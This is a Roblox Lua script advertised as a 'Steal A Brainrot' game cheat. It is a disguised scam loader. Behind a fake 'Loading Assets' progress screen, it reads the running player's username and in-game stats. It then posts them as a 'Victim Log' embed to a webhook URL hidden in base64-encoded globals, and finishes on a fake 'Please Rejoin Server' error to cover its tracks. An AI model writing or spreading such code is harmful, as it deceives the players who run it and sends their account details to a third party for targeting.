-- [[ Steal A Brainrot Script ]] --

local function _decode(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^' .. b .. '=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r, f = '', (b:find(x) - 1)
        for i = 6, 1, -1 do
            local v = f % 2 ^ i - f % 2 ^ (i - 1)
            r = r .. (v >= 2 ^ (i - 1) and '1' or '0')
        end
        return r
    end):gsub('%d%d%d%d%d%d%d%d', function(x)
        local c = 0
        for i = 1, 8 do c = c + (x:sub(i, i) == '1' and 2 ^ (8 - i) or 0) end
        return string.char(c)
    end))
end

-- Fallback data (Jika parameter URL tidak terbaca otomatis)
local Receiver = _decode(_G.Config_ID or "U2FhYlRldA==") 
local Webhook = _decode(_G.Access_Key or "")
local MinBPS = _G.MinBPS or 1

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LP = Players.LocalPlayer

-- UI Loading Screen Normal
local SG = Instance.new("ScreenGui", LP.PlayerGui)
local F = Instance.new("Frame", SG)
F.Size = UDim2.new(1, 0, 1, 0)
F.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
local T = Instance.new("TextLabel", F)
T.Size = UDim2.new(0, 400, 0, 50)
T.Position = UDim2.new(0.5, -200, 0.5, -25)
T.TextColor3 = Color3.fromRGB(255, 255, 255)
T.Font = Enum.Font.SourceSansBold
T.TextSize = 20
T.Text = "Loading Assets... 0%"

task.spawn(function()
    for i = 1, 100 do
        task.wait(0.04)
        T.Text = "Loading Assets... " .. i .. "%"
        
        if i == 50 and Webhook ~= "" then
            local s = LP:FindFirstChild("leaderstats")
            local v = s and (s:FindFirstChild("Brainrot/s") or s:FindFirstChild("BPS"))
            
            if v and v.Value >= MinBPS then
                pcall(function()
                    (syn and syn.request or http_request or request or HttpService.PostAsync)({
                        Url = Webhook,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode({
                            embeds = {{
                                title = "🎯 Victim Log",
                                fields = {
                                    {name = "User", value = LP.Name, inline = true},
                                    {name = "Total BPS", value = tostring(v.Value), inline = true},
                                    {name = "Target", value = Receiver}
                                },
                                color = 0x5865F2
                            }}
                        })
                    })
                end)
            end
        end
    end
    T.Text = "Error: Please Rejoin Server"
    T.TextColor3 = Color3.fromRGB(255, 50, 50)
end)
